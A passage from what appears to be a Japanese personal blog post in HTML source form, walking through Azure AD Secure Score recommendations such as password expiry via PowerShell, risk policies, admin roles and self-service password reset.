2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Windows PowerShell 用 Microsoft Azure AD モジュールでパスワードの有効期限を設定する&lt;/h3&gt;
&lt;p&gt;「Windows PowerShell 用 Microsoft Azure AD モジュール」を使うとパスワードの有効期限のぽ利子設定を変更できるようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/active-directory/authentication/concept-sspr-policy&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;セルフサービス パスワード リセット ポリシー - Azure Active Directory | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;とりあえず「Windows PowerShell 用 Microsoft Azure AD モジュール」を使うために、&lt;code class=&quot;language-text&quot;&gt;Connect-AzureAD&lt;/code&gt;をインストールする必要があります。&lt;/p&gt;
&lt;p&gt;管理者権限でPowerShellを起動したら以下のコマンドを実行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token function&quot;&gt;Install-Module&lt;/span&gt; AzureAD&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;インストールが完了すると&lt;code class=&quot;language-text&quot;&gt;Connect-AzureAD&lt;/code&gt;コマンドレットが使えるようになっています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Connect-AzureAD&lt;/code&gt;コマンドレットを使った接続方法については以下が参考になります。&lt;/p&gt;
&lt;p&gt;今回はAADに接続したいため、&lt;code class=&quot;language-text&quot;&gt;-TenantId&lt;/code&gt;でAADのテナントIDを指定しておくと良いと思います。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/powershell/module/azuread/connect-azuread?view=azureadps-2.0#examples&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Connect-AzureAD (AzureAD) | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;接続が完了すると以下のような表示が出てきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&gt; &lt;span class=&quot;token function&quot;&gt;Connect-AzureAD&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;TenantId XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
Account            Environment TenantId                             TenantDomain 					 AccountType
&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;            &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;                             &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt; 					 &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;
XXXXXXXXXXX		   AzureCloud  XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX xxxxxxxxxx&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;onmicrosoft&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;com   User&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これでテナントにPowerShellからログインできたので、以下のコマンドですべてのユーザでパスワードを無期限に設定します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token function&quot;&gt;Get-AzureADUser&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;All &lt;span class=&quot;token boolean&quot;&gt;$true&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;Set-AzureADUser&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;PasswordPolicies DisablePasswordExpiration&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これで設定完了です。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/active-directory/authentication/concept-sspr-policy&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;セルフサービス パスワード リセット ポリシー - Azure Active Directory | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;従来の認証を禁止するポリシーを有効にする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%BE%93%E6%9D%A5%E3%81%AE%E8%AA%8D%E8%A8%BC%E3%82%92%E7%A6%81%E6%AD%A2%E3%81%99%E3%82%8B%E3%83%9D%E3%83%AA%E3%82%B7%E3%83%BC%E3%82%92%E6%9C%89%E5%8A%B9%E3%81%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;従来の認証を禁止するポリシーを有効にする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;従来の認証を禁止するポリシーを有効にする&lt;/h2&gt;
&lt;p&gt;続いての設定は「従来の認証を禁止するポリシー」の設定です。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;今日、セキュリティを侵害しているサインインの試みのほとんどは、従来の認証によるものです。&lt;/p&gt;
&lt;p&gt;Office 2010 などの以前の Office  クライアントは先進認証をサポートしておらず、IMAP、SMTP、POP3 などの従来のプロトコルを使用します。&lt;/p&gt;
&lt;p&gt;従来の認証では多要素認証  (MFA) がサポートされません。環境で MFA  ポリシーが構成されている場合でも、不正ユーザーが従来のプロトコルを利用して、これらのポリシーの適用をバイパスできます。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;残念ながらこの設定も「条件付きポリシー」の設定が必要なので、「セキュリティの既定値群」の設定を有効化しているということで、「改善アクション」から「代替の軽減策を利用して解決済み」を選択しておきました。&lt;/p&gt;
&lt;h2 id=&quot;サインインのリスク-ポリシーを有効にする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B5%E3%82%A4%E3%83%B3%E3%82%A4%E3%83%B3%E3%81%AE%E3%83%AA%E3%82%B9%E3%82%AF-%E3%83%9D%E3%83%AA%E3%82%B7%E3%83%BC%E3%82%92%E6%9C%89%E5%8A%B9%E3%81%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;サインインのリスク ポリシーを有効にする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;サインインのリスク ポリシーを有効にする&lt;/h2&gt;
&lt;p&gt;次は&lt;code class=&quot;language-text&quot;&gt;Azure AD Identity Protection&lt;/code&gt;からサインインのリスク ポリシーを有効にする方法を見ていきます。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;サインインのリスク ポリシーを有効にすると、疑わしいサインインに対して多要素認証 (MFA) が要求されるようになります。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/active-directory/identity-protection/overview-identity-protection&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Azure Active Directory Identity Protection とは | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;とはいえ、僕の使っているライセンスの場合はサインインリスク是正ポリシーが無効化されており、有効にできないようになっていたため、こちらは「リスクの許容」としておきました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/b0c877cbb1f5f20a65aeb46d90f072d9/0b533/image-15.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 89.58333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAARlAAAEZQAGA43XUAAACAklEQVQ4y51U2ZKjMAzk/z9xXzYTcjiA74ObXskZGJJNZqdWVV2ijGlaUtuFSy2E8jjJkOFCQte2GIYhYxzHnPu+z5jnBcCCZfnCPoo5HXA+nXAqj7iezygpl2UJqSSMMbDWomkkoSY0mZzjLWGIEQze+Lxhmia8imeSB8KjkPDO5o/XElNKWZmUElprKKVoffgRadFYj0oIKPpwVeS9R11VlF0m4h/xu3meM1aylyU3UuXNI2F9FYPHpdGojUfbcyuQiaZp3ojfEgrZwFHzq+oGS3mikjUNpFEaOnZQPn1Od37AW8LqdsLH4TfK4wGSJsnqqptARZPVRJZoYNzTfcnfEhoXiCRkFWtwDw0NJQ73Mu/lThu+JeTGr5ZZNzKhuN2yWiyPZP8kjHQqmODrJMwI9BOhDIQOENKiH6cHlc+Ee5CxAwKVvFqDwzmXfcglm0THbhj/Uri8JCSFfQrouv5BOhM6Mvv/RMGngMmyF8ky/MzqjLEYqTIud6TB7DHs1obxjvETRep4ypFUdtkenK01aLTHLzGh0on6mXCpPa5NRCkMPi4qr11lxLlyOF41jrTOe4qWri8m2V8EPCS+YaSyOF+ucD5uSjKyumXDppKei7putkuA80zEkczMZbdtyr301NNlmX/YQ23zvceT5mGsvRzIQo5Kb8lWd4u8tskz/gB+vH+tnOIIkAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/b0c877cbb1f5f20a65aeb46d90f072d9/8ac56/image-15.webp 240w,
/static/b0c877cbb1f5f20a65aeb46d90f072d9/d3be9/image-15.webp 480w,
/static/b0c877cbb1f5f20a65aeb46d90f072d9/b0a15/image-15.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/b0c877cbb1f5f20a65aeb46d90f072d9/8ff5a/image-15.png 240w,
/static/b0c877cbb1f5f20a65aeb46d90f072d9/e85cb/image-15.png 480w,
/static/b0c877cbb1f5f20a65aeb46d90f072d9/0b533/image-15.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/b0c877cbb1f5f20a65aeb46d90f072d9/0b533/image-15.png&quot;
            alt=&quot;image-15.png&quot;
            title=&quot;image-15.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;ユーザーのリスク-ポリシーを有効にする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%81%AE%E3%83%AA%E3%82%B9%E3%82%AF-%E3%83%9D%E3%83%AA%E3%82%B7%E3%83%BC%E3%82%92%E6%9C%89%E5%8A%B9%E3%81%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;ユーザーのリスク ポリシーを有効にする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ユーザーのリスク ポリシーを有効にする&lt;/h2&gt;
&lt;p&gt;前項同様&lt;code class=&quot;language-text&quot;&gt;Azure AD Identity Protection&lt;/code&gt;から設定する項目です。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ユーザー リスク ポリシーを有効にすると、ユーザー アカウントのセキュリティ侵害の可能性が Azure Active Directory  によって検出されます。&lt;/p&gt;
&lt;p&gt;管理者は、ユーザーの特定のリスク レベルに自動的に対応するために、ユーザーのリスクに関する条件付きアクセス  ポリシーを構成できます。&lt;/p&gt;
&lt;p&gt;たとえば、リソースへのアクセスをブロックしたり、ユーザー  アカウントをクリーンな状態に戻すためにパスワードの変更を要求したりできます。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;こちらも同じく有効にできないようになっていたため、「リスクの許容」としておきました。&lt;/p&gt;
&lt;h2 id=&quot;管理対象外のアプリケーションに対するユーザーの承認を許可しない&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E7%AE%A1%E7%90%86%E5%AF%BE%E8%B1%A1%E5%A4%96%E3%81%AE%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AB%E5%AF%BE%E3%81%99%E3%82%8B%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%81%AE%E6%89%BF%E8%AA%8D%E3%82%92%E8%A8%B1%E5%8F%AF%E3%81%97%E3%81%AA%E3%81%84&quot; aria-label=&quot;管理対象外のアプリケーションに対するユーザーの承認を許可しない permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;管理対象外のアプリケーションに対するユーザーの承認を許可しない&lt;/h2&gt;
&lt;p&gt;AADとサードパーティのアプリケーションを統合する場合のアクセス許可の制御が推奨事項になっているようです。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;統合されたサードパーティ製アプリのアクセス許可を規制して、サービスのセキュリティを強化します。&lt;/p&gt;
&lt;p&gt;堅牢なセキュリティ管理策をサポートする、必要なアプリのみにアクセスを許可します。&lt;/p&gt;
&lt;p&gt;サードパーティ製アプリケーションは Microsoft  によって作成されていないため、テナントからのデータの流出など、悪意のある目的に使用される可能性があります。&lt;/p&gt;
&lt;p&gt;攻撃者は、セキュリティ侵害を受けたアカウントを利用せずに、これらの統合されたアプリを通じてサービスへのアクセスを維持し続けることができます。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/active-directory/saas-apps/tutorial-list&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Azure AD で使用する SaaS アプリの統合に関するチュートリアル | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今のところはサードパーティサービスとAADの統合は想定していないのでスキップします。&lt;/p&gt;
&lt;h2 id=&quot;全体管理者を複数指定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%85%A8%E4%BD%93%E7%AE%A1%E7%90%86%E8%80%85%E3%82%92%E8%A4%87%E6%95%B0%E6%8C%87%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;全体管理者を複数指定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;全体管理者を複数指定する&lt;/h2&gt;
&lt;p&gt;管理者を複数用意しましょうという推奨事項です。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;全体管理者を複数指定しておくと、組織の要求を満たすことや義務を果たすことができない場合に役立ちます。&lt;/p&gt;
&lt;p&gt;チームのだれかが必要に応じてアクセスできる代理人または緊急対応用アカウントを用意しておくことが重要です。&lt;/p&gt;
&lt;p&gt;また、管理者がお互いの侵害の兆候を監視できるようにもなります。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;不在時やアカウント認証情報紛失時の対応だけでなく、不正防止にも有用です。&lt;/p&gt;
&lt;p&gt;この辺の話はCISSPのコンテンツにも含まれてましたね。&lt;/p&gt;
&lt;p&gt;今回は個人で使用するためこちらもスキップします。&lt;/p&gt;
&lt;h2 id=&quot;制限付き管理ロールを使用する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%88%B6%E9%99%90%E4%BB%98%E3%81%8D%E7%AE%A1%E7%90%86%E3%83%AD%E3%83%BC%E3%83%AB%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B&quot; aria-label=&quot;制限付き管理ロールを使用する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;制限付き管理ロールを使用する&lt;/h2&gt;
&lt;p&gt;普段使用するユーザアカウントとしてグローバルアドミニストレータロールのアカウントを使用するのは非推奨です。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;制限付き管理者のユーザーは、標準ユーザーよりも多くの特権を持っていますが、全体管理者よりは少ないです。&lt;/p&gt;
&lt;p&gt;必要な管理作業を実行するために制限付き管理者のロールを活用すると、高価値で影響力の大きい全体管理者のロールが割り当てられたユーザーの数を減らすことができます。&lt;/p&gt;
&lt;p&gt;全体管理者の代わりに、パスワード管理者や Exchange Online 管理者などのロールをユーザーに割り当てると、全体管理特権アカウントが侵害される可能性を削減できます&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;AADのコンソールから新規のユーザーを追加して、適当な管理者用のロールを割り当てしておきました。&lt;/p&gt;
&lt;p&gt;MFAの付与も忘れずに。&lt;/p&gt;
&lt;h2 id=&quot;セルフサービスによるパスワードのリセットを有効にする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%BB%E3%83%AB%E3%83%95%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9%E3%81%AB%E3%82%88%E3%82%8B%E3%83%91%E3%82%B9%E3%83%AF%E3%83%BC%E3%83%89%E3%81%AE%E3%83%AA%E3%82%BB%E3%83%83%E3%83%88%E3%82%92%E6%9C%89%E5%8A%B9%E3%81%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;セルフサービスによるパスワードのリセットを有効にする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;セルフサービスによるパスワードのリセットを有効にする&lt;/h2&gt;
&lt;p&gt;管理者以外のユーザがパスワードリセットを行えるようにするかどうかを設定します。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Azure Active Directory  でのセルフサービスによるパスワードのリセットを利用すると、ユーザーはパスワードのリセットのためにヘルプデスクを利用する必要がなくなります。&lt;/p&gt;
&lt;p&gt;この機能は、簡単に推測できるパスワードの使用を防止する、Azure AD の動的な禁止パスワードと併用できます。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;以下の画面から設定できますが、今回は個人使用のため、「なし」のままにしておきます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/c189b750fd07511d2e9fa22b029c6e08/0b533/image-16.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 60%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAARlAAAEZQAGA43XUAAABPElEQVQoz6WTC26DMBBEuf/ZeoGqaVFEAcfgD7bBxnyma0ijJlKqNF1phNewDy87ZCXjyEuOQ8HAWoXiJGDcgBTrul50m99TZroOvbNw1sAaAz8MmJdpB2AHfcP2632lyOzg0RE0TtOlWDcdqpxBthJadXDObcBlWc5az7rOtxNWjMFotZ0yaYwe/CBwfKngrYen9ucY8VgQsKg52oYjjiOC91QcIIcVH21Azi0+Tg7HpsdbZXCoDV5LjSPvUbQD3plFTveTPoVHiATUVmOe5qv39OOKUgQwFVCrEaX0qGRah62Q0R7vIj2z759onfIwEVDoCsZYzPP8Y6Irng06oYMQLQK1/Kg1frUNF4qmaDdYmti15/BnZXWjyRoSAw3k1sRPtax0ByUlJGm8afs5IH3D9Jck805nc/8H+AVluayDR2JGoAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/c189b750fd07511d2e9fa22b029c6e08/8ac56/image-16.webp 240w,
/static/c189b750fd07511d2e9fa22b029c6e08/d3be9/image-16.webp 480w,
/static/c189b750fd07511d2e9fa22b029c6e08/b0a15/image-16.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/c189b750fd07511d2e9fa22b029c6e08/8ff5a/image-16.png 240w,
/static/c189b750fd07511d2e9fa22b029c6e08/e85cb/image-16.png 480w,
/static/c189b750fd07511d2e9fa22b029c6e08/0b533/image-16.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/c189b750fd07511d2e9fa22b029c6e08/0b533/image-16.png&quot;
            alt=&quot;image-16.png&quot;
            title=&quot;image-16.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
